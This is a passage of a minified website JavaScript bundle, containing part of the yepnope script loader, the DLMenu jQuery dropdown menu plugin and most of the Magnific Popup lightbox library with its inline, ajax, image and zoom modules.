                        a.instead
                            ? a.instead(t, e, s, r, o)
                            : (T[a.url] ? (a.noexec = !0) : (T[a.url] = 1),
                              s.load(a.url, a.forceCSS || (!a.forceJS && "css" == a.url.split(".").pop().split("?").shift()) ? "c" : i, a.noexec, a.attrs, a.timeout),
                              (n(e) || n(l)) &&
                                  s.load(function () {
                                      h(), e && e(a.origUrl, o, r), l && l(a.origUrl, o, r), (T[a.url] = 2);
                                  })));
            }
            function o(t, i) {
                function o(t, r) {
                    if (t) {
                        if (s(t))
                            r ||
                                (c = function () {
                                    var t = [].slice.call(arguments);
                                    d.apply(this, t), f();
                                }),
                                e(t, c, i, 0, h);
                        else if (Object(t) === t)
                            for (l in ((a = (function () {
                                var e,
                                    i = 0;
                                for (e in t) t.hasOwnProperty(e) && i++;
                                return i;
                            })()),
                            t))
                                t.hasOwnProperty(l) &&
                                    (!r &&
                                        !--a &&
                                        (n(c)
                                            ? (c = function () {
                                                  var t = [].slice.call(arguments);
                                                  d.apply(this, t), f();
                                              })
                                            : (c[l] = (function (t) {
                                                  return function () {
                                                      var e = [].slice.call(arguments);
                                                      t && t.apply(this, e), f();
                                                  };
                                              })(d[l]))),
                                    e(t[l], c, i, l, h));
                    } else !r && f();
                }
                var a,
                    l,
                    h = !!t.test,
                    u = t.load || t.both,
                    c = t.callback || r,
                    d = c,
                    f = t.complete || r;
                o(h ? t.yep : t.nope, !!u), u && o(u);
            }
            var a,
                l,
                u = this.yepnope.loader;
            if (s(t)) e(t, 0, u, 0);
            else if (S(t)) for (a = 0; a < t.length; a++) s((l = t[a])) ? e(l, 0, u, 0) : S(l) ? c(l) : Object(l) === l && o(l, u);
            else Object(t) === t && o(t, u);
        }).addPrefix = function (t, e) {
            k[t] = e;
        }),
            (c.addFilter = function (t) {
                C.push(t);
            }),
            (c.errorTimeout = 1e4),
            null == e.readyState &&
                e.addEventListener &&
                ((e.readyState = "loading"),
                e.addEventListener(
                    "DOMContentLoaded",
                    (u = function () {
                        e.removeEventListener("DOMContentLoaded", u, 0), (e.readyState = "complete");
                    }),
                    0
                )),
            (t.yepnope = h()),
            (t.yepnope.executeStack = a),
            (t.yepnope.injectJs = function (t, i, n, s, l, h) {
                var u,
                    d,
                    g = e.createElement("script");
                s = s || c.errorTimeout;
                for (d in ((g.src = t), n)) g.setAttribute(d, n[d]);
                (i = h ? a : i || r),
                    (g.onreadystatechange = g.onload = function () {
                        !u && o(g.readyState) && ((u = 1), i(), (g.onload = g.onreadystatechange = null));
                    }),
                    f(function () {
                        u || ((u = 1), i(1));
                    }, s),
                    l ? g.onload() : p.parentNode.insertBefore(g, p);
            }),
            (t.yepnope.injectCss = function (t, i, n, s, o, l) {
                var h;
                (s = e.createElement("link")), (i = l ? a : i || r);
                for (h in ((s.href = t), (s.rel = "stylesheet"), (s.type = "text/css"), n)) s.setAttribute(h, n[h]);
                o || (p.parentNode.insertBefore(s, p), f(i, 0));
            });
    })(this, document),
    (Modernizr.load = function () {
        yepnope.apply(window, [].slice.call(arguments, 0));
    }),
    (function (t, e, i) {
        "use strict";
        var n = e.Modernizr,
            s = t("body");
        (t.DLMenu = function (e, i) {
            (this.$el = t(i)), this._init(e);
        }),
            (t.DLMenu.defaults = {
                animationClasses: { classin: "dl-animate-in-1", classout: "dl-animate-out-1" },
                onLevelClick: function (t, e) {
                    return !1;
                },
                onLinkClick: function (t, e) {
                    return !1;
                },
                backLabel: '<svg role="img" class="df-icon df-icon--left-arrow"><use xlink:href="/assets/img/necromancers.svg#left-arrow"></use></svg> Back',
                useActiveItemAsBackLabel: !1,
                useActiveItemAsLink: !1,
                resetOnClose: !0,
            }),
            (t.DLMenu.prototype = {
                _init: function (e) {
                    (this.options = t.extend(!0, {}, t.DLMenu.defaults, e)), this._config();
                    (this.animEndEventName = { WebkitAnimation: "webkitAnimationEnd", OAnimation: "oAnimationEnd", msAnimation: "MSAnimationEnd", animation: "animationend" }[n.prefixed("animation")] + ".dlmenu"),
                        (this.transEndEventName =
                            { WebkitTransition: "webkitTransitionEnd", MozTransition: "transitionend", OTransition: "oTransitionEnd", msTransition: "MSTransitionEnd", transition: "transitionend" }[n.prefixed("transition")] + ".dlmenu"),
                        (this.supportAnimations = n.cssanimations),
                        (this.supportTransitions = n.csstransitions),
                        this._initEvents();
                },
                _config: function () {
                    (this.open = !1),
                        (this.$trigger = this.$el.children(".dl-trigger")),
                        (this.$menu = this.$el.children("ul.dl-menu")),
                        (this.$menuitems = this.$menu.find("li:not(.dl-back)")),
                        this.$el.find("ul.dl-submenu").prepend('<li class="dl-back"><a href="#">' + this.options.backLabel + "</a></li>"),
                        (this.$back = this.$menu.find("li.dl-back")),
                        this.options.useActiveItemAsBackLabel &&
                            this.$back.each(function () {
                                var e = t(this),
                                    i = e.parents("li:first").find("a:first").text();
                                e.find("a").html(i);
                            }),
                        this.options.useActiveItemAsLink &&
                            this.$el.find("ul.dl-submenu").prepend(function () {
                                var e = t(this).parents("li:not(.dl-back):first").find("a:first");
                                return '<li class="dl-parent"><a href="' + e.attr("href") + '">' + e.text() + "</a></li>";
                            });
                },
                _initEvents: function () {
                    var e = this;
                    this.$trigger.on("click.dlmenu", function () {
                        return (
                            e.open
                                ? e._closeMenu()
                                : (e._openMenu(),
                                  s
                                      .off("click")
                                      .children()
                                      .on("click.dlmenu", function () {
                                          e._closeMenu();
                                      })),
                            !1
                        );
                    }),
                        this.$menuitems.on("click.dlmenu", function (i) {
                            i.stopPropagation();
                            var n = t(this),
                                s = n.children("ul.dl-submenu");
                            if (s.length > 0 && !t(i.currentTarget).hasClass("dl-subviewopen")) {
                                var r = s.clone().css("opacity", 0).insertAfter(e.$menu),
                                    o = function () {
                                        e.$menu.off(e.animEndEventName).removeClass(e.options.animationClasses.classout).addClass("dl-subview"),
                                            n.addClass("dl-subviewopen").parents(".dl-subviewopen:first").removeClass("dl-subviewopen").addClass("dl-subview"),
                                            r.remove();
                                    };
                                return (
                                    setTimeout(function () {
                                        r.addClass(e.options.animationClasses.classin),
                                            e.$menu.addClass(e.options.animationClasses.classout),
                                            e.supportAnimations ? e.$menu.on(e.animEndEventName, o) : o.call(),
                                            e.options.onLevelClick(n, n.children("a:first").text());
                                    }),
                                    !1
                                );
                            }
                            e.options.onLinkClick(n, i);
                        }),
                        this.$back.on("click.dlmenu", function (i) {
                            var n = t(this),
                                s = n.parents("ul.dl-submenu:first"),
                                r = s.parent(),
                                o = s.clone().insertAfter(e.$menu),
                                a = function () {
                                    e.$menu.off(e.animEndEventName).removeClass(e.options.animationClasses.classin), o.remove();
                                };
                            return (
                                setTimeout(function () {
                                    o.addClass(e.options.animationClasses.classout), e.$menu.addClass(e.options.animationClasses.classin), e.supportAnimations ? e.$menu.on(e.animEndEventName, a) : a.call(), r.removeClass("dl-subviewopen");
                                    var t = n.parents(".dl-subview:first");
                                    t.is("li") && t.addClass("dl-subviewopen"), t.removeClass("dl-subview");
                                }),
                                !1
                            );
                        });
                },
                closeMenu: function () {
                    this.open && this._closeMenu();
                },
                _closeMenu: function () {
                    var t = this,
                        e = function () {
                            t.$menu.off(t.transEndEventName), t.options.resetOnClose && t._resetMenu();
                        };
                    this.$menu.removeClass("dl-menuopen"), this.$menu.addClass("dl-menu-toggle"), this.$trigger.removeClass("dl-active"), this.supportTransitions ? this.$menu.on(this.transEndEventName, e) : e.call(), (this.open = !1);
                },
                openMenu: function () {
                    this.open || this._openMenu();
                },
                _openMenu: function () {
                    var e = this;
                    s.off("click").on("click.dlmenu", function () {
                        e._closeMenu();
                    }),
                        this.$menu.addClass("dl-menuopen dl-menu-toggle").on(this.transEndEventName, function () {
                            t(this).removeClass("dl-menu-toggle");
                        }),
                        this.$trigger.addClass("dl-active"),
                        (this.open = !0);
                },
                _resetMenu: function () {
                    this.$menu.removeClass("dl-subview"), this.$menuitems.removeClass("dl-subview dl-subviewopen");
                },
            });
        var r = function (t) {
            e.console && e.console.error(t);
        };
        t.fn.dlmenu = function (e) {
            if ("string" == typeof e) {
                var i = Array.prototype.slice.call(arguments, 1);
                this.each(function () {
                    var n = t.data(this, "dlmenu");
                    n ? (t.isFunction(n[e]) && "_" !== e.charAt(0) ? n[e].apply(n, i) : r("no such method '" + e + "' for dlmenu instance")) : r("cannot call methods on dlmenu prior to initialization; attempted to call method '" + e + "'");
                });
            } else
                this.each(function () {
                    var i = t.data(this, "dlmenu");
                    i ? i._init() : (i = t.data(this, "dlmenu", new t.DLMenu(e, this)));
                });
            return this;
        };
    })(jQuery, window),
    (function (t) {
        "function" == typeof define && define.amd ? define(["jquery"], t) : "object" == typeof exports ? t(require("jquery")) : t(window.jQuery || window.Zepto);
    })(function (t) {
        var e,
            i,
            n,
            s,
            r,
            o,
            a = "Close",
            l = "BeforeClose",
            h = "MarkupParse",
            u = "Open",
            c = ".mfp",
            d = "mfp-ready",
            f = "mfp-removing",
            p = "mfp-prevent-close",
            g = function () {},
            v = !!window.jQuery,
            m = t(window),
            _ = function (t, i) {
                e.ev.on("mfp" + t + c, i);
            },
            y = function (e, i, n, s) {
                var r = document.createElement("div");
                return (r.className = "mfp-" + e), n && (r.innerHTML = n), s ? i && i.appendChild(r) : ((r = t(r)), i && r.appendTo(i)), r;
            },
            w = function (i, n) {
                e.ev.triggerHandler("mfp" + i, n), e.st.callbacks && ((i = i.charAt(0).toLowerCase() + i.slice(1)), e.st.callbacks[i] && e.st.callbacks[i].apply(e, t.isArray(n) ? n : [n]));
            },
            x = function (i) {
                return (i === o && e.currTemplate.closeBtn) || ((e.currTemplate.closeBtn = t(e.st.closeMarkup.replace("%title%", e.st.tClose))), (o = i)), e.currTemplate.closeBtn;
            },
            b = function () {
                t.magnificPopup.instance || ((e = new g()).init(), (t.magnificPopup.instance = e));
            };
        (g.prototype = {
            constructor: g,
            init: function () {
                var i = navigator.appVersion;
                (e.isLowIE = e.isIE8 = document.all && !document.addEventListener),
                    (e.isAndroid = /android/gi.test(i)),
                    (e.isIOS = /iphone|ipad|ipod/gi.test(i)),
                    (e.supportsTransition = (function () {
                        var t = document.createElement("p").style,
                            e = ["ms", "O", "Moz", "Webkit"];
                        if (void 0 !== t.transition) return !0;
                        for (; e.length; ) if (e.pop() + "Transition" in t) return !0;
                        return !1;
                    })()),
                    (e.probablyMobile = e.isAndroid || e.isIOS || /(Opera Mini)|Kindle|webOS|BlackBerry|(Opera Mobi)|(Windows Phone)|IEMobile/i.test(navigator.userAgent)),
                    (n = t(document)),
                    (e.popupsCache = {});
            },
            open: function (i) {
                var s;
                if (!1 === i.isObj) {
                    (e.items = i.items.toArray()), (e.index = 0);
                    var o,
                        a = i.items;
                    for (s = 0; s < a.length; s++)
                        if (((o = a[s]).parsed && (o = o.el[0]), o === i.el[0])) {
                            e.index = s;
                            break;
                        }
                } else (e.items = t.isArray(i.items) ? i.items : [i.items]), (e.index = i.index || 0);
                if (!e.isOpen) {
                    (e.types = []),
                        (r = ""),
                        i.mainEl && i.mainEl.length ? (e.ev = i.mainEl.eq(0)) : (e.ev = n),
                        i.key ? (e.popupsCache[i.key] || (e.popupsCache[i.key] = {}), (e.currTemplate = e.popupsCache[i.key])) : (e.currTemplate = {}),
                        (e.st = t.extend(!0, {}, t.magnificPopup.defaults, i)),
                        (e.fixedContentPos = "auto" === e.st.fixedContentPos ? !e.probablyMobile : e.st.fixedContentPos),
                        e.st.modal && ((e.st.closeOnContentClick = !1), (e.st.closeOnBgClick = !1), (e.st.showCloseBtn = !1), (e.st.enableEscapeKey = !1)),
                        e.bgOverlay ||
                            ((e.bgOverlay = y("bg").on("click" + c, function () {
                                e.close();
                            })),
                            (e.wrap = y("wrap")
                                .attr("tabindex", -1)
                                .on("click" + c, function (t) {
                                    e._checkIfClose(t.target) && e.close();
                                })),
                            (e.container = y("container", e.wrap))),
                        (e.contentContainer = y("content")),
                        e.st.preloader && (e.preloader = y("preloader", e.container, e.st.tLoading));
                    var l = t.magnificPopup.modules;
                    for (s = 0; s < l.length; s++) {
                        var f = l[s];
                        (f = f.charAt(0).toUpperCase() + f.slice(1)), e["init" + f].call(e);
                    }
                    w("BeforeOpen"),
                        e.st.showCloseBtn &&
                            (e.st.closeBtnInside
                                ? (_(h, function (t, e, i, n) {
                                      i.close_replaceWith = x(n.type);
                                  }),
                                  (r += " mfp-close-btn-in"))
                                : e.wrap.append(x())),
                        e.st.alignTop && (r += " mfp-align-top"),
                        e.fixedContentPos ? e.wrap.css({ overflow: e.st.overflowY, overflowX: "hidden", overflowY: e.st.overflowY }) : e.wrap.css({ top: m.scrollTop(), position: "absolute" }),
                        (!1 === e.st.fixedBgPos || ("auto" === e.st.fixedBgPos && !e.fixedContentPos)) && e.bgOverlay.css({ height: n.height(), position: "absolute" }),
                        e.st.enableEscapeKey &&
                            n.on("keyup" + c, function (t) {
                                27 === t.keyCode && e.close();
                            }),
                        m.on("resize" + c, function () {
                            e.updateSize();
                        }),
                        e.st.closeOnContentClick || (r += " mfp-auto-cursor"),
                        r && e.wrap.addClass(r);
                    var p = (e.wH = m.height()),
                        g = {};
                    if (e.fixedContentPos && e._hasScrollBar(p)) {
                        var v = e._getScrollbarSize();
                        v && (g.marginRight = v);
                    }
                    e.fixedContentPos && (e.isIE7 ? t("body, html").css("overflow", "hidden") : (g.overflow = "hidden"));
                    var b = e.st.mainClass;
                    return (
                        e.isIE7 && (b += " mfp-ie7"),
                        b && e._addClassToMFP(b),
                        e.updateItemHTML(),
                        w("BuildControls"),
                        t("html").css(g),
                        e.bgOverlay.add(e.wrap).prependTo(e.st.prependTo || t(document.body)),
                        (e._lastFocusedEl = document.activeElement),
                        setTimeout(function () {
                            e.content ? (e._addClassToMFP(d), e._setFocus()) : e.bgOverlay.addClass(d), n.on("focusin" + c, e._onFocusIn);
                        }, 16),
                        (e.isOpen = !0),
                        e.updateSize(p),
                        w(u),
                        i
                    );
                }
                e.updateItemHTML();
            },
            close: function () {
                e.isOpen &&
                    (w(l),
                    (e.isOpen = !1),
                    e.st.removalDelay && !e.isLowIE && e.supportsTransition
                        ? (e._addClassToMFP(f),
                          setTimeout(function () {
                              e._close();
                          }, e.st.removalDelay))
                        : e._close());
            },
            _close: function () {
                w(a);
                var i = f + " " + d + " ";
                if ((e.bgOverlay.detach(), e.wrap.detach(), e.container.empty(), e.st.mainClass && (i += e.st.mainClass + " "), e._removeClassFromMFP(i), e.fixedContentPos)) {
                    var s = { marginRight: "" };
                    e.isIE7 ? t("body, html").css("overflow", "") : (s.overflow = ""), t("html").css(s);
                }
                n.off("keyup.mfp focusin" + c),
                    e.ev.off(c),
                    e.wrap.attr("class", "mfp-wrap").removeAttr("style"),
                    e.bgOverlay.attr("class", "mfp-bg"),
                    e.container.attr("class", "mfp-container"),
                    !e.st.showCloseBtn || (e.st.closeBtnInside && !0 !== e.currTemplate[e.currItem.type]) || (e.currTemplate.closeBtn && e.currTemplate.closeBtn.detach()),
                    e.st.autoFocusLast && e._lastFocusedEl && t(e._lastFocusedEl).focus(),
                    (e.currItem = null),
                    (e.content = null),
                    (e.currTemplate = null),
                    (e.prevHeight = 0),
                    w("AfterClose");
            },
            updateSize: function (t) {
                if (e.isIOS) {
                    var i = document.documentElement.clientWidth / window.innerWidth,
                        n = window.innerHeight * i;
                    e.wrap.css("height", n), (e.wH = n);
                } else e.wH = t || m.height();
                e.fixedContentPos || e.wrap.css("height", e.wH), w("Resize");
            },
            updateItemHTML: function () {
                var i = e.items[e.index];
                e.contentContainer.detach(), e.content && e.content.detach(), i.parsed || (i = e.parseEl(e.index));
                var n = i.type;
                if ((w("BeforeChange", [e.currItem ? e.currItem.type : "", n]), (e.currItem = i), !e.currTemplate[n])) {
                    var r = !!e.st[n] && e.st[n].markup;
                    w("FirstMarkupParse", r), (e.currTemplate[n] = !r || t(r));
                }
                s && s !== i.type && e.container.removeClass("mfp-" + s + "-holder");
                var o = e["get" + n.charAt(0).toUpperCase() + n.slice(1)](i, e.currTemplate[n]);
                e.appendContent(o, n), (i.preloaded = !0), w("Change", i), (s = i.type), e.container.prepend(e.contentContainer), w("AfterChange");
            },
            appendContent: function (t, i) {
                (e.content = t),
                    t ? (e.st.showCloseBtn && e.st.closeBtnInside && !0 === e.currTemplate[i] ? e.content.find(".mfp-close").length || e.content.append(x()) : (e.content = t)) : (e.content = ""),
                    w("BeforeAppend"),
                    e.container.addClass("mfp-" + i + "-holder"),
                    e.contentContainer.append(e.content);
            },
            parseEl: function (i) {
                var n,
                    s = e.items[i];
                if ((s.tagName ? (s = { el: t(s) }) : ((n = s.type), (s = { data: s, src: s.src })), s.el)) {
                    for (var r = e.types, o = 0; o < r.length; o++)
                        if (s.el.hasClass("mfp-" + r[o])) {
                            n = r[o];
                            break;
                        }
                    (s.src = s.el.attr("data-mfp-src")), s.src || (s.src = s.el.attr("href"));
                }
                return (s.type = n || e.st.type || "inline"), (s.index = i), (s.parsed = !0), (e.items[i] = s), w("ElementParse", s), e.items[i];
            },
            addGroup: function (t, i) {
                var n = function (n) {
                    (n.mfpEl = this), e._openClick(n, t, i);
                };
                i || (i = {});
                var s = "click.magnificPopup";
                (i.mainEl = t), i.items ? ((i.isObj = !0), t.off(s).on(s, n)) : ((i.isObj = !1), i.delegate ? t.off(s).on(s, i.delegate, n) : ((i.items = t), t.off(s).on(s, n)));
            },
            _openClick: function (i, n, s) {
                if ((void 0 !== s.midClick ? s.midClick : t.magnificPopup.defaults.midClick) || !(2 === i.which || i.ctrlKey || i.metaKey || i.altKey || i.shiftKey)) {
                    var r = void 0 !== s.disableOn ? s.disableOn : t.magnificPopup.defaults.disableOn;
                    if (r)
                        if (t.isFunction(r)) {
                            if (!r.call(e)) return !0;
                        } else if (m.width() < r) return !0;
                    i.type && (i.preventDefault(), e.isOpen && i.stopPropagation()), (s.el = t(i.mfpEl)), s.delegate && (s.items = n.find(s.delegate)), e.open(s);
                }
            },
            updateStatus: function (t, n) {
                if (e.preloader) {
                    i !== t && e.container.removeClass("mfp-s-" + i), n || "loading" !== t || (n = e.st.tLoading);
                    var s = { status: t, text: n };
                    w("UpdateStatus", s),
                        (t = s.status),
                        (n = s.text),
                        e.preloader.html(n),
                        e.preloader.find("a").on("click", function (t) {
                            t.stopImmediatePropagation();
                        }),
                        e.container.addClass("mfp-s-" + t),
                        (i = t);
                }
            },
            _checkIfClose: function (i) {
                if (!t(i).hasClass(p)) {
                    var n = e.st.closeOnContentClick,
                        s = e.st.closeOnBgClick;
                    if (n && s) return !0;
                    if (!e.content || t(i).hasClass("mfp-close") || (e.preloader && i === e.preloader[0])) return !0;
                    if (i === e.content[0] || t.contains(e.content[0], i)) {
                        if (n) return !0;
                    } else if (s && t.contains(document, i)) return !0;
                    return !1;
                }
            },
            _addClassToMFP: function (t) {
                e.bgOverlay.addClass(t), e.wrap.addClass(t);
            },
            _removeClassFromMFP: function (t) {
                this.bgOverlay.removeClass(t), e.wrap.removeClass(t);
            },
            _hasScrollBar: function (t) {
                return (e.isIE7 ? n.height() : document.body.scrollHeight) > (t || m.height());
            },
            _setFocus: function () {
                (e.st.focus ? e.content.find(e.st.focus).eq(0) : e.wrap).focus();
            },
            _onFocusIn: function (i) {
                if (i.target !== e.wrap[0] && !t.contains(e.wrap[0], i.target)) return e._setFocus(), !1;
            },
            _parseMarkup: function (e, i, n) {
                var s;
                n.data && (i = t.extend(n.data, i)),
                    w(h, [e, i, n]),
                    t.each(i, function (i, n) {
                        if (void 0 === n || !1 === n) return !0;
                        if ((s = i.split("_")).length > 1) {
                            var r = e.find(c + "-" + s[0]);
                            if (r.length > 0) {
                                var o = s[1];
                                "replaceWith" === o ? r[0] !== n[0] && r.replaceWith(n) : "img" === o ? (r.is("img") ? r.attr("src", n) : r.replaceWith(t("<img>").attr("src", n).attr("class", r.attr("class")))) : r.attr(s[1], n);
                            }
                        } else e.find(c + "-" + i).html(n);
                    });
            },
            _getScrollbarSize: function () {
                if (void 0 === e.scrollbarSize) {
                    var t = document.createElement("div");
                    (t.style.cssText = "width: 99px; height: 99px; overflow: scroll; position: absolute; top: -9999px;"), document.body.appendChild(t), (e.scrollbarSize = t.offsetWidth - t.clientWidth), document.body.removeChild(t);
                }
                return e.scrollbarSize;
            },
        }),
            (t.magnificPopup = {
                instance: null,
                proto: g.prototype,
                modules: [],
                open: function (e, i) {
                    return b(), ((e = e ? t.extend(!0, {}, e) : {}).isObj = !0), (e.index = i || 0), this.instance.open(e);
                },
                close: function () {
                    return t.magnificPopup.instance && t.magnificPopup.instance.close();
                },
                registerModule: function (e, i) {
                    i.options && (t.magnificPopup.defaults[e] = i.options), t.extend(this.proto, i.proto), this.modules.push(e);
                },
                defaults: {
                    disableOn: 0,
                    key: null,
                    midClick: !1,
                    mainClass: "",
                    preloader: !0,
                    focus: "",
                    closeOnContentClick: !1,
                    closeOnBgClick: !0,
                    closeBtnInside: !0,
                    showCloseBtn: !0,
                    enableEscapeKey: !0,
                    modal: !1,
                    alignTop: !1,
                    removalDelay: 0,
                    prependTo: null,
                    fixedContentPos: "auto",
                    fixedBgPos: "auto",
                    overflowY: "auto",
                    closeMarkup: '<button title="%title%" type="button" class="mfp-close">&#215;</button>',
                    tClose: "Close (Esc)",
                    tLoading: "Loading...",
                    autoFocusLast: !0,
                },
            }),
            (t.fn.magnificPopup = function (i) {
                b();
                var n = t(this);
                if ("string" == typeof i)
                    if ("open" === i) {
                        var s,
                            r = v ? n.data("magnificPopup") : n[0].magnificPopup,
                            o = parseInt(arguments[1], 10) || 0;
                        r.items ? (s = r.items[o]) : ((s = n), r.delegate && (s = s.find(r.delegate)), (s = s.eq(o))), e._openClick({ mfpEl: s }, n, r);
                    } else e.isOpen && e[i].apply(e, Array.prototype.slice.call(arguments, 1));
                else (i = t.extend(!0, {}, i)), v ? n.data("magnificPopup", i) : (n[0].magnificPopup = i), e.addGroup(n, i);
                return n;
            });
        var S,
            C,
            T,
            k = "inline",
            I = function () {
                T && (C.after(T.addClass(S)).detach(), (T = null));
            };
        t.magnificPopup.registerModule(k, {
            options: { hiddenClass: "hide", markup: "", tNotFound: "Content not found" },
            proto: {
                initInline: function () {
                    e.types.push(k),
                        _(a + "." + k, function () {
                            I();
                        });
                },
                getInline: function (i, n) {
                    if ((I(), i.src)) {
                        var s = e.st.inline,
                            r = t(i.src);
                        if (r.length) {
                            var o = r[0].parentNode;
                            o && o.tagName && (C || ((S = s.hiddenClass), (C = y(S)), (S = "mfp-" + S)), (T = r.after(C).detach().removeClass(S))), e.updateStatus("ready");
                        } else e.updateStatus("error", s.tNotFound), (r = t("<div>"));
                        return (i.inlineElement = r), r;
                    }
                    return e.updateStatus("ready"), e._parseMarkup(n, {}, i), n;
                },
            },
        });
        var O,
            P = "ajax",
            M = function () {
                O && t(document.body).removeClass(O);
            },
            z = function () {
                M(), e.req && e.req.abort();
            };
        t.magnificPopup.registerModule(P, {
            options: { settings: null, cursor: "mfp-ajax-cur", tError: '<a href="%url%">The content</a> could not be loaded.' },
            proto: {
                initAjax: function () {
                    e.types.push(P), (O = e.st.ajax.cursor), _(a + "." + P, z), _("BeforeChange." + P, z);
                },
                getAjax: function (i) {
                    O && t(document.body).addClass(O), e.updateStatus("loading");
                    var n = t.extend(
                        {
                            url: i.src,
                            success: function (n, s, r) {
                                var o = { data: n, xhr: r };
                                w("ParseAjax", o),
                                    e.appendContent(t(o.data), P),
                                    (i.finished = !0),
                                    M(),
                                    e._setFocus(),
                                    setTimeout(function () {
                                        e.wrap.addClass(d);
                                    }, 16),
                                    e.updateStatus("ready"),
                                    w("AjaxContentAdded");
                            },
                            error: function () {
                                M(), (i.finished = i.loadError = !0), e.updateStatus("error", e.st.ajax.tError.replace("%url%", i.src));
                            },
                        },
                        e.st.ajax.settings
                    );
                    return (e.req = t.ajax(n)), "";
                },
            },
        });
        var A;
        t.magnificPopup.registerModule("image", {
            options: {
                markup:
                    '<div class="mfp-figure"><div class="mfp-close"></div><figure><div class="mfp-img"></div><figcaption><div class="mfp-bottom-bar"><div class="mfp-title"></div><div class="mfp-counter"></div></div></figcaption></figure></div>',
                cursor: "mfp-zoom-out-cur",
                titleSrc: "title",
                verticalFit: !0,
                tError: '<a href="%url%">The image</a> could not be loaded.',
            },
            proto: {
                initImage: function () {
                    var i = e.st.image,
                        n = ".image";
                    e.types.push("image"),
                        _(u + n, function () {
                            "image" === e.currItem.type && i.cursor && t(document.body).addClass(i.cursor);
                        }),
                        _(a + n, function () {
                            i.cursor && t(document.body).removeClass(i.cursor), m.off("resize" + c);
                        }),
                        _("Resize" + n, e.resizeImage),
                        e.isLowIE && _("AfterChange", e.resizeImage);
                },
                resizeImage: function () {
                    var t = e.currItem;
                    if (t && t.img && e.st.image.verticalFit) {
                        var i = 0;
                        e.isLowIE && (i = parseInt(t.img.css("padding-top"), 10) + parseInt(t.img.css("padding-bottom"), 10)), t.img.css("max-height", e.wH - i);
                    }
                },
                _onImageHasSize: function (t) {
                    t.img && ((t.hasSize = !0), A && clearInterval(A), (t.isCheckingImgSize = !1), w("ImageHasSize", t), t.imgHidden && (e.content && e.content.removeClass("mfp-loading"), (t.imgHidden = !1)));
                },
                findImageSize: function (t) {
                    var i = 0,
                        n = t.img[0],
                        s = function (r) {
                            A && clearInterval(A),
                                (A = setInterval(function () {
                                    n.naturalWidth > 0 ? e._onImageHasSize(t) : (i > 200 && clearInterval(A), 3 === ++i ? s(10) : 40 === i ? s(50) : 100 === i && s(500));
                                }, r));
                        };
                    s(1);
                },
                getImage: function (i, n) {
                    var s = 0,
                        r = function () {
                            i &&
                                (i.img[0].complete
                                    ? (i.img.off(".mfploader"), i === e.currItem && (e._onImageHasSize(i), e.updateStatus("ready")), (i.hasSize = !0), (i.loaded = !0), w("ImageLoadComplete"))
                                    : ++s < 200
                                    ? setTimeout(r, 100)
                                    : o());
                        },
                        o = function () {
                            i && (i.img.off(".mfploader"), i === e.currItem && (e._onImageHasSize(i), e.updateStatus("error", a.tError.replace("%url%", i.src))), (i.hasSize = !0), (i.loaded = !0), (i.loadError = !0));
                        },
                        a = e.st.image,
                        l = n.find(".mfp-img");
                    if (l.length) {
                        var h = document.createElement("img");
                        (h.className = "mfp-img"),
                            i.el && i.el.find("img").length && (h.alt = i.el.find("img").attr("alt")),
                            (i.img = t(h).on("load.mfploader", r).on("error.mfploader", o)),
                            (h.src = i.src),
                            l.is("img") && (i.img = i.img.clone()),
                            (h = i.img[0]).naturalWidth > 0 ? (i.hasSize = !0) : h.width || (i.hasSize = !1);
                    }
                    return (
                        e._parseMarkup(
                            n,
                            {
                                title: (function (i) {
                                    if (i.data && void 0 !== i.data.title) return i.data.title;
                                    var n = e.st.image.titleSrc;
                                    if (n) {
                                        if (t.isFunction(n)) return n.call(e, i);
                                        if (i.el) return i.el.attr(n) || "";
                                    }
                                    return "";
                                })(i),
                                img_replaceWith: i.img,
                            },
                            i
                        ),
                        e.resizeImage(),
                        i.hasSize
                            ? (A && clearInterval(A), i.loadError ? (n.addClass("mfp-loading"), e.updateStatus("error", a.tError.replace("%url%", i.src))) : (n.removeClass("mfp-loading"), e.updateStatus("ready")), n)
                            : (e.updateStatus("loading"), (i.loading = !0), i.hasSize || ((i.imgHidden = !0), n.addClass("mfp-loading"), e.findImageSize(i)), n)
                    );
                },
            },
        });
        var E;
        t.magnificPopup.registerModule("zoom", {
            options: {
                enabled: !1,
                easing: "ease-in-out",
                duration: 300,
                opener: function (t) {
                    return t.is("img") ? t : t.find("img");
                },
            },
            proto: {
                initZoom: function () {
                    var t,
                        i = e.st.zoom,
                        n = ".zoom";
                    if (i.enabled && e.supportsTransition) {
                        var s,
                            r,
                            o = i.duration,
                            h = function (t) {
                                var e = t.clone().removeAttr("style").removeAttr("class").addClass("mfp-animated-image"),
                                    n = "all " + i.duration / 1e3 + "s " + i.easing,
                                    s = { position: "fixed", zIndex: 9999, left: 0, top: 0, "-webkit-backface-visibility": "hidden" },
                                    r = "transition";
                                return (s["-webkit-" + r] = s["-moz-" + r] = s["-o-" + r] = s[r] = n), e.css(s), e;
                            },
                            u = function () {
                                e.content.css("visibility", "visible");
                            };
                        _("BuildControls" + n, function () {
                            if (e._allowZoom()) {
                                if ((clearTimeout(s), e.content.css("visibility", "hidden"), !(t = e._getItemToZoom()))) return void u();
                                (r = h(t)).css(e._getOffset()),
                                    e.wrap.append(r),
                                    (s = setTimeout(function () {
                                        r.css(e._getOffset(!0)),
                                            (s = setTimeout(function () {
                                                u(),
                                                    setTimeout(function () {
                                                        r.remove(), (t = r = null), w("ZoomAnimationEnded");
                                                    }, 16);
                                            }, o));
                                    }, 16));
                            }
                        }),
                            _(l + n, function () {
                                if (e._allowZoom()) {
                                    if ((clearTimeout(s), (e.st.removalDelay = o), !t)) {
                                        if (!(t = e._getItemToZoom())) return;
                                        r = h(t);
                                    }
                                    r.css(e._getOffset(!0)),
                                        e.wrap.append(r),
                                        e.content.css("visibility", "hidden"),
                                        setTimeout(function () {
                                            r.css(e._getOffset());
                                        }, 16);
                                }
                            }),
                            _(a + n, function () {
                                e._allowZoom() && (u(), r && r.remove(), (t = null));
                            });
                    }
                },
                _allowZoom: function () {
                    return "image" === e.currItem.type;
                },
                _getItemToZoom: function () {
                    return !!e.currItem.hasSize && e.currItem.img;
                },
                _getOffset: function (i) {
                    var n,
                        s = (n = i ? e.currItem.img : e.st.zoom.opener(e.currItem.el || e.currItem)).offset(),
                        r = parseInt(n.css("padding-top"), 10),
                        o = parseInt(n.css("padding-bottom"), 10);
                    s.top -= t(window).scrollTop() - r;
                    var a = { width: n.width(), height: (v ? n.innerHeight() : n[0].offsetHeight) - o - r };
